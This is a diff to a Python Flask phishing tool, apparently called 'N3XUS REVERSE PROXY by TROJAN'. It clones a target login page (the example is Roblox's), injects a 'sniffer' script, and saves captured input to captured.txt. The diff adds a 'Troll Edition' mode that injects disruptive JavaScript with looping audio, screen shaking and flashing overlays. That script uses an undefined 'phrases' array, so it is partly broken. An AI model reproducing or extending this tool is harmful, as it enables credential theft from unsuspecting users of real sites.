@@ -12,11 +12,110 @@ log.setLevel(logging.ERROR)
 app = Flask(__name__)
 target_site = ""
 
-
 LOCAL_PAGE = "index_local.html"
 server_started = False
 
-def download_mirror(url):
+# Код Troll Edition для внедрения в зеркало
+TROLL_SCRIPT_CODE = """
+(function() {
+    const sources = [
+        "https://www.myinstants.com/media/sounds/spongebob-theme.mp3",
+        "https://www.myinstants.com/media/sounds/spongebob-music-84965.mp3",
+        "https://www.myinstants.com/media/sounds/spongebob-theme-76331.mp3"
+    ];
+
+    let music = null;
+    let current = 0;
+
+    function playMusic() {
+        if (music) {
+            music.pause();
+            music = null;
+        }
+        music = new Audio(sources[current]);
+        music.volume = 0.85;
+        music.loop = true;
+
+        music.play().catch(() => {
+            current = (current + 1) % sources.length;
+            if (current !== 0) playMusic();
+        });
+    }
+
+    playMusic();
+
+    document.addEventListener("click", () => {
+        if (music && music.paused) {
+            music.play().catch(() => {});
+        }
+    }, { once: true });
+
+    const style = document.createElement("style");
+    style.innerHTML = `
+        @keyframes rgb {
+            0%   { filter: hue-rotate(0deg); }
+            100% { filter: hue-rotate(360deg); }
+        }
+        @keyframes glow {
+            0%, 100% { box-shadow: 0 0 25px #ff00ff, 0 0 50px #00ffff; }
+            50% { box-shadow: 0 0 50px #00ff00, 0 0 90px #ff0000; }
+        }
+        @keyframes float {
+            0% { transform: translateY(0) rotate(-5deg); }
+            50% { transform: translateY(-35px) rotate(8deg); }
+            100% { transform: translateY(0) rotate(-5deg); }
+        }
+        body {
+            animation: rgb 3.5s linear infinite !important;
+        }
+        .sb-meme {
+            position: fixed;
+            z-index: 999999;
+            pointer-events: none;
+            font-family: 'Comic Sans MS', cursive, sans-serif;
+            font-weight: bold;
+            font-size: 26px;
+            color: #fff;
+            text-shadow: 0 0 12px #ff00ff, 0 0 25px #00ffff, 0 0 40px #ffff00;
+            animation: float 2.2s ease-in-out infinite, rgb 2.5s linear infinite;
+            user-select: none;
+        }
+    `;
+    document.head.appendChild(style);
+
+    
+    for (let i = 0; i < 14; i++) {
+        const el = document.createElement("div");
+        el.className = "sb-meme";
+        el.innerText = phrases[Math.floor(Math.random() * phrases.length)];
+        el.style.left = Math.random() * 88 + "vw";
+        el.style.top = Math.random() * 78 + "vh";
+        el.style.animationDelay = (Math.random() * 2.5) + "s";
+        el.style.fontSize = (20 + Math.random() * 18) + "px";
+        document.body.appendChild(el);
+    }
+
+    const border = document.createElement("div");
+    border.style.cssText = `
+        position: fixed;
+        inset: 0;
+        pointer-events: none;
+        z-index: 999998;
+        border: 10px solid;
+        border-image: linear-gradient(45deg, #ff0000, #ff00ff, #00ffff, #00ff00, #ffff00, #ff0000) 1;
+        animation: rgb 1.8s linear infinite, glow 1.3s ease-in-out infinite;
+    `;
+    document.body.appendChild(border);
+
+    let shake = 0;
+    setInterval(() => {
+        shake = shake === 0 ? 4 : 0;
+        document.body.style.transform = `translate(${shake}px, ${-shake}px)`;
+    }, 70);
+})();
+"""
+
+def download_mirror(url, troll_mode=False):
     headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
     try:
         print("\n[*] Создание локальной копии страницы...")
@@ -52,10 +151,20 @@ def download_mirror(url):
             });
         }, true);
         """
+        
         if soup.body:
             soup.body.append(sniffer_script)
+            # Внедрение Troll Edition, если выбран соответствующий режим
+            if troll_mode:
+                troll_tag = soup.new_tag("script")
+                troll_tag.string = TROLL_SCRIPT_CODE
+                soup.body.append(troll_tag)
         else:
             soup.append(sniffer_script)
+            if troll_mode:
+                troll_tag = soup.new_tag("script")
+                troll_tag.string = TROLL_SCRIPT_CODE
+                soup.append(troll_tag)
 
         with open(LOCAL_PAGE, "w", encoding="utf-8") as f:
             f.write(str(soup))
@@ -121,17 +230,19 @@ if __name__ == "__main__":
         print("         N3XUS REVERSE PROXY")
         print("              by TROJAN     ")
         print("="*40)
-        print(" [1] Указать ссылку и запустить зеркало")
-        print(" [2] Посмотреть пойманные данные (captured.txt)")
-        print(" [3] Выход")
+        print(" [1] Указать ссылку и запустить зеркало (Обычный)")
+        print(" [2] Запустить зеркало + Troll Edition 🧽")
+        print(" [3] Посмотреть пойманные данные (captured.txt)")
+        print(" [4] Выход")
         print("="*40)
 
         choice = input("Выберите пункт: ").strip()
 
-        if choice == "1":
+        if choice in ["1", "2"]:
+            troll_mode = (choice == "2")
             target_site = input("\nВведите целевой URL (например, https://www.roblox.com/Login): ").strip()
             if target_site:
-                download_mirror(target_site)
+                download_mirror(target_site, troll_mode=troll_mode)
 
                 if not server_started:
                     threading.Thread(target=run_flask, daemon=True).start()
@@ -145,7 +256,7 @@ if __name__ == "__main__":
             else:
                 input("\n[!] Ссылка не может быть пустой. Нажмите Enter...")
 
-        elif choice == "2":
+        elif choice == "3":
             print("\n" + "="*40)
             print(" --- СОХРАНЕННЫЕ ДАННЫЕ ---")
             if os.path.exists("captured.txt"):
@@ -156,8 +267,9 @@ if __name__ == "__main__":
             print("="*40)
             input("\nНажмите Enter, чтобы вернуться в меню...")
 
-        elif choice == "3":
+        elif choice == "4":
             print("Выход из программы...")
             os._exit(0)
         else:
             input("\n[!] Неверный выбор. Нажмите Enter...")
+        
